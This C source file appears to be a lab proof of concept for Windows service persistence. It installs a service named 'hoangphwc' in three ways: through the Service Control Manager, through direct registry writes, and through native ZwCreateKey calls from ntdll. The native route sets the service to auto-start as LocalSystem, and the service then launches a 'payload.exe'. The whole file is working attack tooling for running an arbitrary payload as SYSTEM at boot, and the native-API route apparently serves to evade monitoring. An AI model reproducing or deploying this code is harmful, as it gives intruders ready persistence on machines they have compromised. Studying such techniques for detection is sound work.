#include <stdio.h>
#include <Windows.h>
#include <winsvc.h>

#define BUFFER_SIZE 1024
#define BREAK_WITH_ERROR(m)                                   \
    {                                                         \
        printf("[-] %s! Error code 0x%x", m, GetLastError()); \
        break;                                                \
    }

#define BREAK_WITH_STATUS(m, s)                   \
    {                                             \
        printf("[-] %s! Status code 0x%x", m, s); \
        break;                                    \
    }

#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)

#define OBJ_CASE_INSENSITIVE 0x00000040L

#define InitializeObjectAttributes(p, n, a, r, s) \
    {                                             \
        (p)->Length = sizeof(OBJECT_ATTRIBUTES);  \
        (p)->RootDirectory = r;                   \
        (p)->Attributes = a;                      \
        (p)->ObjectName = n;                      \
        (p)->SecurityDescriptor = s;              \
        (p)->SecurityQualityOfService = NULL;     \
    }

typedef struct _UNICODE_STRING
{
    USHORT Length;
    USHORT MaximumLength;
    PWSTR Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES
{
    ULONG Length;
    HANDLE RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG Attributes;
    PVOID SecurityDescriptor;       // Points to type SECURITY_DESCRIPTOR
    PVOID SecurityQualityOfService; // Points to type SECURITY_QUALITY_OF_SERVICE
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;

typedef NTSTATUS(NTAPI *pfnZwCreateKey)(
    OUT PHANDLE KeyHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes,
    IN ULONG TitleIndex,
    IN PUNICODE_STRING Class OPTIONAL,
    IN ULONG CreateOptions,
    OUT PULONG Disposition OPTIONAL);

typedef NTSTATUS(NTAPI *pfnZwSetValueKey)(
    IN HANDLE KeyHandle,
    IN PUNICODE_STRING ValueName,
    IN ULONG TitleIndex OPTIONAL,
    IN ULONG Type,
    IN PVOID Data,
    IN ULONG DataSize);

HANDLE g_hStopEvent;
SERVICE_STATUS g_Status;
SERVICE_STATUS_HANDLE g_hService;

BOOL InstallService1();
BOOL InstallService2();
BOOL InstallService3();
BOOL IsRunningElevated();
BOOL StartService1();
BOOL StopService1();
BOOL UninstallService1();
BOOL HandleCommand(int argc, const wchar_t *argv[]);
VOID WINAPI SyaorenMain(DWORD dwNumServiceArgs, LPWSTR *lpServiceArgVectors);
VOID InitUnicodeString(PUNICODE_STRING DestinationString, PCWSTR SourceString);

int wmain(int argc, const wchar_t *argv[])
{
    if (argc > 1)
        return HandleCommand(argc, argv);

    WCHAR serviceName[] = L"hoangphwc";
    CONST SERVICE_TABLE_ENTRYW entry[] = {
        {serviceName, SyaorenMain},
        {NULL, NULL}};
    if (!StartServiceCtrlDispatcherW(entry))
        return 1;
    return 0;
}

BOOL IsRunningElevated()
{
    HANDLE hToken = NULL;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
        return FALSE;
    DWORD elevation = 0, elevationLen = 0;
    GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &elevationLen);
    CloseHandle(hToken);
    return elevation ? TRUE : FALSE;
}

BOOL HandleCommand(int argc, const wchar_t *argv[])
{
    if (!IsRunningElevated())
        return 1;

    if (!_wcsicmp(argv[1], L"install1"))
        return InstallService1();

    if (!_wcsicmp(argv[1], L"install2"))
        return InstallService2();

    if (!_wcsicmp(argv[1], L"install3"))
        return InstallService3();

    if (!_wcsicmp(argv[1], L"start"))
        return StartService1();

    if (!_wcsicmp(argv[1], L"stop"))
        return StopService1();

    if (!_wcsicmp(argv[1], L"uninstall"))
        return UninstallService1();
}

VOID InitUnicodeString(PUNICODE_STRING destinationString, PCWSTR sourceString)
{
    destinationString->Buffer = (PWSTR)sourceString;
    destinationString->Length = (USHORT)(wcslen(sourceString) * sizeof(WCHAR));
    destinationString->MaximumLength = destinationString->Length + sizeof(WCHAR);
}

BOOL InstallService3()
{
    BOOL returnStatus = FALSE;
    NTSTATUS status = 0;
    HMODULE hNtdll = NULL;

    pfnZwCreateKey pZwCreateKey = NULL;
    pfnZwSetValueKey pZwSetValueKey = NULL;

    HKEY hKey = NULL;
    UNICODE_STRING keyName = {0},
                   valueName = {0};
    OBJECT_ATTRIBUTES objectAttributes;

    WCHAR objectName[] = L"LocalSystem",
          imagePath[] = L"C:\\Users\\vagrant\\Desktop\\PoC\\Service.exe",
          keyPath[] = L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\hoangphwc";

    DWORD error = SERVICE_ERROR_NORMAL,
          startType = SERVICE_AUTO_START,
          serviceType = SERVICE_WIN32_OWN_PROCESS;

    do
    {
        if (!(hNtdll = GetModuleHandleW(L"ntdll")))
            break;

        if (!(pZwCreateKey = GetProcAddress(hNtdll, "ZwCreateKey")))
            break;

        if (!(pZwSetValueKey = GetProcAddress(hNtdll, "ZwSetValueKey")))
            break;

        InitUnicodeString(&keyName, keyPath);
        InitializeObjectAttributes(&objectAttributes, &keyName, OBJ_CASE_INSENSITIVE, NULL, NULL);

        if (!NT_SUCCESS(status = pZwCreateKey(&hKey, KEY_SET_VALUE, &objectAttributes, 0, NULL, REG_OPTION_NON_VOLATILE, NULL)))
            BREAK_WITH_STATUS("Failed to create key", status);

        InitUnicodeString(&valueName, L"ErrorControl");
        if (!NT_SUCCESS(status = pZwSetValueKey(hKey, &valueName, 0, REG_DWORD, &error, sizeof(error))))
            BREAK_WITH_STATUS("Failed to set error control", status);

        InitUnicodeString(&valueName, L"ImagePath");
        if (!NT_SUCCESS(status = pZwSetValueKey(hKey, &valueName, 0, REG_EXPAND_SZ, imagePath, wcslen(imagePath) * sizeof(*imagePath))))
            BREAK_WITH_STATUS("Failed to set image path", status);

        InitUnicodeString(&valueName, L"ObjectName");
        if (!NT_SUCCESS(status = pZwSetValueKey(hKey, &valueName, 0, REG_SZ, objectName, wcslen(objectName) * sizeof(*objectName))))
            BREAK_WITH_STATUS("Failed to set object name", status);

        InitUnicodeString(&valueName, L"Start");
        if (!NT_SUCCESS(status = pZwSetValueKey(hKey, &valueName, 0, REG_DWORD, &startType, sizeof(startType))))
            BREAK_WITH_STATUS("Failed to set start type", status);

        InitUnicodeString(&valueName, L"Type");
        if (!NT_SUCCESS(status = pZwSetValueKey(hKey, &valueName, 0, REG_DWORD, &serviceType, sizeof(serviceType))))
            BREAK_WITH_STATUS("Failed to set service type", status);

        printf("[+] Create service success!\n");
        returnStatus = TRUE;
    } while (0);

    if (hNtdll)
        CloseHandle(hNtdll);

    if (hKey)
        RegCloseKey(hKey);

    return returnStatus;
}

BOOL InstallService2()
{
    BOOL returnStatus = FALSE;
    HKEY hKey = NULL;
    LSTATUS lResult = 0;
    DWORD disposition = 0,
          startType = SERVICE_DEMAND_START,
          serviceType = SERVICE_WIN32_OWN_PROCESS,
          errorControl = SERVICE_ERROR_NORMAL;
    CONST WCHAR subKey[] = L"SYSTEM\\CurrentControlSet\\Services\\hoangphwc",
                imagePath[] = L"C:\\Users\\vagrant\\Desktop\\PoC\\Service.exe",
                objectName[] = L"LocalSystem";

    do
    {
        if (ERROR_SUCCESS != RegCreateKeyExW(HKEY_LOCAL_MACHINE, subKey, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &hKey, &disposition))
            break;

        if (ERROR_SUCCESS != RegSetValueExW(hKey, L"ErrorControl", 0, REG_DWORD, &errorControl, sizeof(errorControl)))
            break;

        if (ERROR_SUCCESS != RegSetValueExW(hKey, L"ImagePath", 0, REG_EXPAND_SZ, imagePath, wcslen(imagePath) * sizeof(*imagePath)))
            break;

        if (ERROR_SUCCESS != RegSetValueExW(hKey, L"ObjectName", 0, REG_SZ, objectName, wcslen(objectName) * sizeof(*objectName)))
            break;

        if (ERROR_SUCCESS != RegSetValueExW(hKey, L"Start", 0, REG_DWORD, &startType, sizeof(startType)))
            break;

        if (ERROR_SUCCESS != RegSetValueExW(hKey, L"Type", 0, REG_DWORD, &serviceType, sizeof(serviceType)))
            break;

        returnStatus = TRUE;
    } while (0);

    RegCloseKey(hKey);
    return returnStatus;
}

BOOL InstallService1()
{
    SC_HANDLE hSCM = NULL, hService = NULL;
    BOOL returnStatus = FALSE;
    WCHAR path[] = L"C:\\Users\\vagrant\\Desktop\\PoC\\Service.exe";
    SERVICE_DESCRIPTION description = {0};

    do
    {
        if (!(hSCM = OpenSCManagerW(NULL, NULL, SC_MANAGER_CREATE_SERVICE)))
            BREAK_WITH_ERROR("Failed to open SCM");

        hService = CreateServiceW(hSCM,
                                  L"hoangphwc",
                                  NULL,
                                  SERVICE_CHANGE_CONFIG,
                                  SERVICE_WIN32_OWN_PROCESS,
                                  SERVICE_DEMAND_START,
                                  SERVICE_ERROR_NORMAL,
                                  path,
                                  NULL, NULL, NULL, NULL, NULL);
        if (!hService)
            BREAK_WITH_ERROR("Failed to create service");

        printf("[+] Create service success\n");

        description.lpDescription = L"Who am i? MRX";
        if (!ChangeServiceConfig2W(hService, SERVICE_CONFIG_DESCRIPTION, &description))
            BREAK_WITH_ERROR("Failed to set up description");

        printf("[+] Set description success\n");
        returnStatus = TRUE;

    } while (0);

    if (hService)
        CloseServiceHandle(hService);

    if (hSCM)
        CloseServiceHandle(hSCM);

    return returnStatus;
}

BOOL StartService1()
{
    BOOL returnStatus = FALSE;
    SC_HANDLE hSCM = NULL, hService = NULL;

    do
    {
        if (!(hSCM = OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT)))
            BREAK_WITH_ERROR("Failed to connect to SCM");

        if (!(hService = OpenServiceW(hSCM, L"hoangphwc", SERVICE_START)))
            BREAK_WITH_ERROR("Failed to open service");

        if (!StartServiceW(hService, 0, NULL))
            BREAK_WITH_ERROR("Failed to start service");

        printf("[+] Start service success\n");
        returnStatus = TRUE;
    } while (0);

    if (hService)
        CloseServiceHandle(hService);

    if (hSCM)
        CloseServiceHandle(hSCM);

    return returnStatus;
}

BOOL StopService1()
{
    BOOL returnStatus = FALSE;
    SC_HANDLE hSCM = NULL, hService = NULL;

    do
    {
        if (!(hSCM = OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT)))
            BREAK_WITH_ERROR("Failed to connect to SCM");

        if (!(hService = OpenServiceW(hSCM, L"hoangphwc", SERVICE_STOP)))
            BREAK_WITH_ERROR("Failed to open service");

        if (!ControlService(hService, SERVICE_CONTROL_STOP, &g_Status))
            BREAK_WITH_ERROR("Failed to stop service");

        printf("[+] Stop service success\n");
        returnStatus = TRUE;
    } while (0);

    if (hService)
        CloseServiceHandle(hService);

    if (hSCM)
        CloseServiceHandle(hSCM);

    return returnStatus;
}

BOOL UninstallService1()
{
    BOOL returnStatus = FALSE;
    SERVICE_STATUS status = {0};
    SC_HANDLE hSCM = NULL, hService = NULL;

    do
    {
        if (!(hSCM = OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT)))
            BREAK_WITH_ERROR("Failed to connect to SCM");

        if (!(hService = OpenServiceW(hSCM, L"hoangphwc", DELETE | SERVICE_QUERY_STATUS)))
            BREAK_WITH_ERROR("Failed to open service");

        if (QueryServiceStatus(hService, &status) && status.dwCurrentState == SERVICE_RUNNING)
            StopService1();

        if (!DeleteService(hService))
            BREAK_WITH_ERROR("Failed to uninstall service");

        printf("[+] Uninstall service success\n");
        returnStatus = TRUE;
    } while (0);

    if (hService)
        CloseServiceHandle(hService);

    if (hSCM)
        CloseServiceHandle(hSCM);

    return returnStatus;
}

void RunPayload()
{
    HANDLE hProcess;
    PROCESS_INFORMATION pi;
    STARTUPINFOW si;
    RtlZeroMemory(&pi, sizeof(pi));
    RtlZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    if (!CreateProcessW(L"C:\\Users\\vagrant\\Desktop\\PoC\\payload.exe", NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi))
        return;

    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
}

VOID SetStatus(DWORD status)
{
    g_Status.dwCurrentState = status;
    g_Status.dwControlsAccepted = status == SERVICE_RUNNING ? SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN : 0;
    SetServiceStatus(g_hService, &g_Status);
}

VOID WINAPI SyaorenHandler(DWORD dwControl)
{
    switch (dwControl)
    {
    case SERVICE_CONTROL_STOP:
        SetStatus(SERVICE_STOP_PENDING);
        SetEvent(g_hStopEvent);
        break;
    case SERVICE_CONTROL_SHUTDOWN:
        SetStatus(SERVICE_STOP_PENDING);
        SetEvent(g_hStopEvent);
        break;
    }
    return;
}

VOID WINAPI SyaorenMain(DWORD dwNumServiceArgs, LPWSTR *lpServiceArgVectors)
{
    RtlZeroMemory(&g_Status, sizeof(g_Status));
    g_Status.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
    BOOL error = TRUE;
    HANDLE hThread;
    DWORD threadId;

    do
    {
        if (!(g_hService = RegisterServiceCtrlHandlerW(L"hoangphwc", SyaorenHandler)))
            break;

        if (!(g_hStopEvent = CreateEventW(NULL, FALSE, FALSE, NULL)))
            break;

        SetStatus(SERVICE_START_PENDING);
        RunPayload();
        error = TRUE;
    } while (0);

    if (!error)
        SetStatus(SERVICE_STOPPED);

    SetStatus(SERVICE_RUNNING);
    while (WAIT_TIMEOUT == WaitForSingleObject(g_hStopEvent, 1000))
        ;
    SetStatus(SERVICE_STOPPED);
    if (g_hStopEvent)
        CloseHandle(g_hStopEvent);
}
